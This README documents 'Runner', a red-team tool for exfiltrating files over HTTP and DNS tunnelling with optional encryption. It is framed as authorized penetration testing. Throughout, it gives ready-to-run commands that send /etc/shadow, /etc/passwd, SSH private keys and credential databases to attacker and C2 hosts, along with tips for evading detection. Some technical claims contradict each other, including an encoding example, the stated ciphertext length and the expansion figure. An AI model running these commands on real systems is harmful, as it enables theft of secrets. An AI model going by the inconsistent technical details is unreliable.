# Runner - Data Exfiltration Tool

## Main Objective

**Runner** is a specialized Red Team tool designed to facilitate data exfiltration during security assessments and authorized penetration testing engagements. The tool provides stealthy data extraction capabilities through multiple covert channels with optional payload encryption. Files are encrypted using ChaCha20-Poly1305 AEAD cipher (when enabled), then encoded into base64-encoded chunks and transmitted via HTTP or DNS protocols to evade detection mechanisms.

## Encryption Mechanism

### Overview

Runner includes an optional **ChaCha20-Poly1305 AEAD encryption** mechanism to protect payload confidentiality during transmission. When enabled, files are encrypted before encoding and chunking, providing authenticated encryption with associated data (AEAD).

**Key Details:**
- **Algorithm**: ChaCha20-Poly1305 (AEAD cipher)
- **Key Size**: 256 bits (32 bytes)
- **Nonce Size**: 96 bits (12 bytes)
- **Nonce Derivation**: Last 12 bytes of the root node identifier string
- **Authentication**: Automatic message authentication via Poly1305

### Key Management

Three strategies are supported for providing the encryption key:

#### 1. String Key (Direct)
Pass the key directly as a command-line argument:
```bash
--cipher-key str=my_32_byte_encryption_key_here
```
**Security Note**: This approach is visible in process lists and shell history. Use only for testing/development.

#### 2. File-Based Key
Store the key in a file and reference it:
```bash
--cipher-key file=/path/to/keyfile.txt
```
The keyfile should contain exactly 32 bytes (256 bits) of key material. Can be generated with:
```bash
openssl rand -hex 16 > keyfile.txt  # generates 32 hex chars (16 bytes after decoding)
# OR
head -c 32 /dev/urandom | base64 > keyfile.txt
```
**Security Note**: File permissions should restrict access (chmod 600).

#### 3. Remote URL
Fetch the key from a remote HTTP endpoint:
```bash
--cipher-key url=https://key-server.internal/keys/default.txt
```
The endpoint should return the 32-byte key as plaintext or base64-encoded. Runner will fetch and use the key for encryption.

**Security Note**: Ensure the key server is accessible only over secure channels and authenticate requests when possible.

### Encryption Pipeline

When `--cipher-key` is provided, the data flow becomes:

```
File → [ChaCha20-Poly1305 Encryption] → Encrypted Bytes
  ↓
[Base64 Encoding] → Base64 String
  ↓
[Hex Encoding] → Hex String
  ↓
[Chunking] → Multiple Chunks
  ↓
[HTTP/DNS Transport]
```

### Nonce Derivation

The nonce for ChaCha20-Poly1305 is derived from the root node identifier to ensure uniqueness:
- Root node identifier: 4 random bytes (32-bit value)
- Serialized to string: `r:filename:hexidentifier`
- Last 12 bytes of this string are used as the nonce
- This ensures different files get different nonces even with the same key

### Error Handling

Encryption may fail for the following reasons:
- **Invalid Key Length**: Key must be exactly 32 bytes. If shorter/longer, an error is raised.
- **Invalid Nonce Length**: If nonce derivation fails (shouldn't happen), an error is raised.
- **Encryption Failure**: The underlying ChaCha20-Poly1305 library fails (rare).

All encryption-related errors are reported as `ChaCha20Error` in the output.

## Commands Available

### Global Command Structure
```
runner <OPERATION> <EXFILTRATION_TYPE> [OPTIONS]
```

### Operations

#### 1. Exfiltration via HTTP

Exfiltrate files using HTTP POST requests.

**Command:**
```bash
runner exfil http --src-files <FILE1>,<FILE2>,... -u <URL> [OPTIONS]
```

**Arguments:**
- `--src-files`: Comma-separated list of file paths to exfiltrate (required)
- `-u, --url`: Destination URL endpoint (required)
- `--delay`: Delay between chunk transmissions in milliseconds (default: 500ms, minimum: 50ms)
- `--chunks`: Number of chunks to split each file into (default: 10, minimum: 1)

**Example:**
```bash
runner exfil http --src-files /path/to/secrets.txt,/path/to/creds.db -u https://attacker.com/receive --delay 1000 --chunks 20
```

**Behavior:**
- Reads each specified file
- **Optionally encrypts** file content using ChaCha20-Poly1305 (if `--cipher-key` provided)
- Encodes encrypted/plaintext content using base64 and hex encoding
- Splits encoded content into specified number of chunks
- Sends each chunk via HTTP POST with `Content-Type: text/plain`
- Applies configurable delay between transmissions

**Example with Encryption:**
```bash
runner exfil http --src-files /path/to/secrets.txt -u https://attacker.com/receive \
  --delay 1000 --chunks 20 --cipher-key str=my_32_byte_encryption_key_here
```

#### 2. Exfiltration via DNS

Exfiltrate a file using DNS TXT record queries (DNS tunneling).

**Command:**
```bash
runner exfil dns -f <FILE> -d <DOMAIN> [OPTIONS]
```

**Arguments:**
- `-f, --src-file`: File path to exfiltrate (required)
- `-d, --dest`: Destination domain name (required)
- `--delay`: Delay between DNS queries in milliseconds (default: 500ms)
- `-p, --protocol`: DNS protocol to use - `tcp` or `udp` (default: udp)
- `-n, --nameserver`: Custom nameserver address (default: 127.0.0.1:53)

**Example:**
```bash
runner exfil dns -f /etc/passwd -d exfil.attacker.com --delay 800 -p tcp -n 8.8.8.8:53
```

**Behavior:**
- Reads the specified file
- **Optionally encrypts** file content using ChaCha20-Poly1305 (if `--cipher-key` provided)
- Computes optimal chunk size based on DNS domain length constraints (max 255 chars, labels max 63 chars)
- Encodes encrypted/plaintext content using DNS-safe base64 and hex encoding
- Sends DNS TXT queries with encoded chunks as subdomain labels
- Applies configurable delay between queries
- Supports both TCP and UDP DNS protocols

**Example with Encryption:**
```bash
runner exfil dns -f /etc/passwd -d exfil.attacker.com \
  --delay 800 -p tcp -n 8.8.8.8:53 --cipher-key file=/etc/keys/exfil.key
```

## Base64 Encoding Structure

### Node Structure

All exfiltrated data is organized into a hierarchical node structure consisting of two primary node types:

#### Root Node (Type: 'r')
The root node contains metadata about the file being exfiltrated. Each root node has the following format:

```
r:<filename>:<file_identifier>
```

Where:
- **r** - Node type identifier (always 'r' for root nodes)
- **filename** - The original filename of the file being exfiltrated
- **file_identifier** - A unique 4-byte random hex-encoded identifier that links all chunks of a file together during reconstruction (e.g., `a1b2c3d4`)

**Example:**
```
r:secrets.txt:a1b2c3d4
```

#### File Chunk Nodes (Type: 'f' or 'e')
File chunk nodes contain portions of the exfiltrated file. Each chunk node has the following format:

```
f:<root_identifier>:<chunk_index>:<hex_encoded_data>
e:<root_identifier>:<chunk_index>:<hex_encoded_data>
```

Where:
- **f** - Node type identifier for regular file chunks
- **e** - Node type identifier for the final (end) chunk that marks the file boundary
- **root_identifier** - The same 4-byte hex identifier from the root node (e.g., `a1b2c3d4`)
- **chunk_index** - Sequential zero-based chunk index within the file (in hexadecimal)
- **hex_encoded_data** - The file data encoded as hexadecimal

**Examples:**
```
f:a1b2c3d4:0:48656c6c6f20576f726c64...    (regular chunk)
e:a1b2c3d4:A:476f6f6462796521...            (final chunk)
```

### Encoding Pipeline

The runner tool applies a multi-stage encoding pipeline to ensure data is safely transmitted over constrained channels (HTTP or DNS):

#### Stage 0: Optional Encryption (New)
If a cipher key is provided via `--cipher-key`, the raw file bytes are encrypted using ChaCha20-Poly1305:

```
Input:  Raw file bytes
Key:    32-byte encryption key (provided via --cipher-key)
Nonce:  12-byte nonce derived from root node identifier
Output: Encrypted ciphertext (same length as input due to stream cipher)
```

The encrypted bytes then proceed through stages 1-4 as normal.

#### Stage 1: Node Serialization
The file (or encrypted data) is first split into chunks and organized into nodes (root node followed by file chunk nodes). Each node is serialized to a colon-delimited string representation:

```
[NodeType]:[Metadata]:[Data]
```

#### Stage 2: Base64 Encoding
The serialized node string is encoded using standard Base64 (RFC 4648), expanding the data by approximately 33%:

```
Input:  r:secrets.txt:a1b2c3d4
Output: cjpzZWNyZXRzLnR4dDphMWIyYzNkNA==
```

#### Stage 3: Hex Encoding
The Base64 output is then hex-encoded, converting each Base64 character to its hexadecimal ASCII representation, creating a fully alphanumeric payload:

```
Input:  cjpzZWNyZXRzLnR4dDphMWIyYzNkNA==
Output: 636a3078656372657465732e7478743a613162326333643430
```

#### Stage 4: Transport-Specific Formatting
Depending on the exfiltration method, the encoded data is formatted differently:

**For HTTP Exfiltration:**
- Encoded chunks are transmitted directly in the HTTP POST body
- Multiple chunks are sent in separate HTTP POST requests
- Each request contains one complete encoded chunk

**For DNS Exfiltration:**
- Encoded chunks are split into DNS-safe labels (max 63 characters per label)
- Labels are joined with dots (.) to form valid DNS domain names
- Each label becomes a subdomain in DNS TXT queries
- Example: `636a3078.656372657465.732e7478.742e613162323333643430.exfil.attacker.com`

#### Summary

This multi-stage pipeline ensures that:
1. **Confidentiality**: Optional ChaCha20-Poly1305 encryption protects data from passive observers
2. **Authenticity**: AEAD cipher provides message authentication
3. **Compatibility**: Binary data is safely converted to text-only transmission
4. **Metadata Preservation**: File information is preserved for reconstruction
5. **Protocol Constraints**: Payload fits within DNS label length and HTTP content type limits

**Data Growth with Encryption:**
- Plaintext → Encrypted (1x, stream cipher adds 16-byte authentication tag)
- Encrypted → Base64 (1.33x)
- Base64 → Hex (2x)
- **Total expansion**: ~3.33x original size

## Installation

### Prerequisites
- Rust 1.70+ (2021 edition)

### Build from Source
```bash
git clone <repository-url>
cd runner
cargo build --release
```

The compiled binary will be located at `target/release/runner`.

## Usage Examples

### Scenario 1: Exfiltrate Multiple Files via HTTP (Unencrypted)
```bash
runner exfil http \
  --src-files /tmp/credentials.txt,/var/log/sensitive.log \
  -u https://c2server.com/upload \
  --delay 2000 \
  --chunks 15
```

### Scenario 2: Exfiltrate via HTTP with Encryption (String Key)
```bash
runner exfil http \
  --src-files /tmp/sensitive_data.bin \
  -u https://c2server.com/upload \
  --delay 1500 \
  --chunks 20 \
  --cipher-key str=my_super_secret_32_byte_key_123
```
**Security Note**: The key is visible in process listings. Use file-based keys for production.

### Scenario 3: Exfiltrate via HTTP with File-Based Key
```bash
# Generate a random 32-byte key and store in a file
openssl rand -out /tmp/exfil.key 32

# Use the key file
runner exfil http \
  --src-files /var/www/html/db.sqlite \
  -u https://c2server.com/upload \
  --delay 2000 \
  --chunks 25 \
  --cipher-key file=/tmp/exfil.key
```
**Security Note**: Ensure key file has restricted permissions: `chmod 600 /tmp/exfil.key`

### Scenario 4: Exfiltrate via DNS over TCP with URL-Based Key
```bash
runner exfil dns \
  -f /etc/shadow \
  -d data.malicious.com \
  -p tcp \
  -n 192.168.1.100:53 \
  --delay 1500 \
  --cipher-key url=https://internal-key-server.corp/keys/production
```
**Security Note**: Ensure the key server is accessed over HTTPS and uses strong authentication.

### Scenario 5: Fast DNS Exfiltration via UDP (Unencrypted, Low Stealth)
```bash
runner exfil dns \
  -f /etc/passwd \
  -d exfil.attacker.com \
  -p udp \
  -n 8.8.8.8:53 \
  --delay 50
```

### Scenario 6: Exfiltrate via DNS with Encryption and TCP
```bash
runner exfil dns \
  -f /root/.ssh/id_rsa \
  -d c2.internal.com \
  -p tcp \
  -n 10.0.0.1:53 \
  --delay 2000 \
  --cipher-key file=/opt/keys/dns-exfil.key

```

## TODO List

### High Priority
- [x] **Payload chunks identification** - Implement IDs for each payload chunk for better tracking
- [x] **Add error handling** - Robust error handling for file I/O and network operations
- [x] **Add Logging Options** - Structured logging for operational tracking and debugging
- [x] **Add Encryption Options** - Implement ChaCha20-Poly1305 AEAD encryption for payload confidentiality
- [x] **Key Management options** - Support string, file-based, and URL-based key retrieval
- [ ] **Add Shuffle Option** - Randomize chunk transmission order to evade pattern detection
- [ ] **Add Random delay** - Introduce random variance in delay intervals between payload chunks
- [ ] **Add Retry Mechanisms** - Automatic retry on transmission failures with exponential backoff

### Medium Priority
- [ ] **Add Different Exfiltration Methods**:
  - [ ] ICMP tunneling (ping exfiltration)
  - [ ] SMTP (email-based exfiltration)
  - [ ] FTP/SFTP
  - [ ] WebSocket channels
  - [ ] Cloud storage APIs (S3, GCS, Azure Blob)
- [ ] **Add Progress Indicators** - Real-time progress bars and transmission statistics
- [ ] **Add Compression Options** - Implement gzip/zlib compression before encryption to reduce payload size

### Low Priority
- [ ] Add steganography support (hide data in images/audio)
- [ ] Add exfiltration via social media platforms (Discord, Telegram bots)
- [ ] Add exfiltration via file sharing services (Dropbox, Google Drive)
- [ ] Implement Zero-Copy techniques
- [ ] Implement intelligent warning based on domain length and chunk size (The bigger the domain name, the smaller the chunk size, and this is not currently indicated to the user)

## Security Considerations

**WARNING:** This tool is designed for authorized security testing only. Unauthorized use of this tool for data exfiltration is illegal and unethical. Always obtain proper authorization before using this tool in any engagement.

### Encryption Security Notes

**Key Management:**
- **String Keys**: Avoid passing keys as command-line arguments in production. Keys are visible in process lists and shell history.
- **File-Based Keys**: Store keys with restricted permissions (`chmod 600`) on secure systems. Use secure storage mechanisms (encrypted filesystems, hardware security modules) when available.
- **URL-Based Keys**: Ensure the key server is accessed over HTTPS only. Implement strong authentication (mTLS, API keys) and audit key retrieval requests.
- **Key Size**: Always use 32-byte (256-bit) keys. The tool will reject shorter or longer keys.

**Nonce Generation:**
- Nonces are deterministically derived from the root node identifier
- This ensures the same file exfiltrated with the same key will produce different ciphertexts (due to random file identifiers)
- However, identical files with identical identifiers will produce identical ciphertexts
- For maximum security, ensure file identifiers are truly random (the default behavior)

**Authentication:**
- ChaCha20-Poly1305 provides authenticated encryption (AEAD)
- Tampering with encrypted data will be detected during decryption on the receiver side
- Do not reuse key+nonce combinations in a single exfiltration session

**Transport Security:**
- Encryption provides confidentiality, not necessarily anonymity
- DNS queries are still visible in DNS logs; use encrypted DNS (DoH/DoT) to hide query contents from ISP
- HTTP exfiltration should use HTTPS to encrypt the transport layer
- Consider using a VPN or proxy to obscure traffic patterns

### No Warranty

This software is provided "as is" without warranty of any kind, express or implied. The authors are not liable for any damage, data loss, or legal consequences resulting from its use.
